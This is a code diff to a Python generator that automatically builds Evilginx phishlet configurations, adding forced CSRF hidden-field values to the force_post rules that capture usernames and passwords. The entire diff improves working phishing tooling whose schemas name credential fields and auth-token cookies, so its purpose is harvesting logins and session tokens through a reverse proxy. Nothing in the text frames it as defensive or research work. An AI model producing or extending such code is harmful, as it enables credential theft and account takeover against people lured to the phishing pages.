@@ -10,7 +10,7 @@ from ruamel.yaml.scalarstring import SingleQuotedScalarString as SQ
 
 from app.schemas.phishlet import (
     Phishlet, ProxyHost, SubFilter, AuthTokenCookie,
-    CredentialField, Credentials, ForcePost, ForcePostSearch,
+    CredentialField, Credentials, ForcePost, ForcePostSearch, ForcePostForce,
     JsInject, LoginConfig, PhishletGenerateResponse,
 )
 from app.schemas.analysis import AnalysisResult
@@ -475,6 +475,7 @@ class PhishletGenerator:
             action_url = form.action_url or analysis.target_url
             parsed = urlparse(action_url)
             search_items: list[ForcePostSearch] = []
+            force_items: list[ForcePostForce] = []
 
             if credentials.username:
                 search_items.append(ForcePostSearch(key=credentials.username.key, search="(.*)"))
@@ -487,11 +488,17 @@ class PhishletGenerator:
                     name_lower = field.field_name.lower()
                     if any(ind in name_lower for ind in csrf_indicators):
                         search_items.append(ForcePostSearch(key=field.field_name, search="(.*)"))
+                        # Also add to force list so Evilginx forces the hidden field value
+                        force_items.append(ForcePostForce(
+                            key=field.field_name,
+                            value=field.field_value or "",
+                        ))
 
             if search_items:
                 force_posts.append(ForcePost(
                     path=parsed.path or "/",
                     search=search_items,
+                    force=force_items if force_items else [],
                     type="post",
                 ))
 
@@ -506,7 +513,12 @@ class PhishletGenerator:
                     if credentials.password:
                         search_items.append(ForcePostSearch(key=credentials.password.key, search="(.*)"))
                     if search_items:
-                        force_posts.append(ForcePost(path=parsed.path, search=search_items, type="post"))
+                        force_posts.append(ForcePost(
+                            path=parsed.path,
+                            search=search_items,
+                            force=[],
+                            type="post",
+                        ))
                         break
 
         return force_posts
@@ -658,6 +670,16 @@ class PhishletGenerator:
                     s_entry["search"] = SQ(s.search)
                     search_seq.append(s_entry)
                 entry["search"] = search_seq
+                # Serialize force field (required by Evilginx)
+                force_seq = CommentedSeq()
+                if fp.force:
+                    for f in fp.force:
+                        f_entry = CommentedMap()
+                        f_entry.fa.set_flow_style()
+                        f_entry["key"] = SQ(f.key)
+                        f_entry["value"] = SQ(f.value)
+                        force_seq.append(f_entry)
+                entry["force"] = force_seq
                 entry["type"] = SQ(fp.type)
                 fp_seq.append(entry)
             doc["force_post"] = fp_seq
